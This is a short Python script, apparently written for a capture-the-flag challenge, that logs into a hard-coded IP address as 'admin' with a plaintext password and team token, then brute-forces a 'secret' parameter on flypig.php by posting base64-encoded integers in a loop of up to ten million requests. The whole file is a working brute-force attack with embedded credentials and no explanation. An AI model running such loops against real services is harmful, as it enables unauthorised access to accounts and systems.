import itertools
import requests
import base64

url = 'http://39.107.33.62:31928/'

s = requests.session()
login_data = {
    'team': 'icqff65bca6f3c108611ebcf276e3647',
    'username': 'admin',
    'password': 'I10ve3P|g~'
}
s.post(url + 'login.php', data=login_data)


for i in range(10000000):
    r = s.post(url + 'flypig.php', data={'secret': base64.b64encode(str(i).encode())})
    print(i)
    if 'Wrong secret' != r.text:
        print(r.text)

